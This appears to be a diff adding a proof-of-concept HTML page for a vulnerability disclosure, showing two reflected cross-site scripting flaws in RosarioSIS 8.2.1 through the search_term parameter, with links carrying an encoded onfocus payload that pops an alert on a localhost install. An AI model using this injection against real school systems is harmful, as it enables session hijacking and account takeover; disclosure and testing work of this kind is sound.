@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>PoC - RosarioSIS 8.2.1 Reflected XSS</title>
+		<style>li{margin-bottom: 22px;}</style>
+	</head>
+	<body>
+		<h1>Cross Site Scripting (XSS) in RosarioSIS 8.2.1</h1>
+		<ol>
+			<li>
+				XSS in Modules.php?modname=misc/ChooseCourse.php&modfunc=choose_course&course_modfunc=search via the search_term parameter<br>
+				<a href="#" onclick='window.open("http://localhost/rosariosis/Modules.php?modname=misc/ChooseCourse.php&modfunc=choose_course&course_modfunc=search&last_year=&search_term=%22%20onfocus%3D%22alert%28%60XSS%60%29"); return false;'>Open in Browser</a>
+			</li>
+			<li>
+				XSS in Modules.php?modname=misc/ChooseRequest.php&modfunc=choose_course&course_modfunc=search via the search_term parameter<br>
+				<a href="#" onclick='window.open("http://localhost/rosariosis/Modules.php?modname=misc/ChooseRequest.php&modfunc=choose_course&course_modfunc=search&last_year=&search_term=%22%20onfocus%3D%22alert%28%60XSS%60%29"); return false;'>Open in Browser</a>
+			</li>
+		</ol>
+	</body>
+</html>
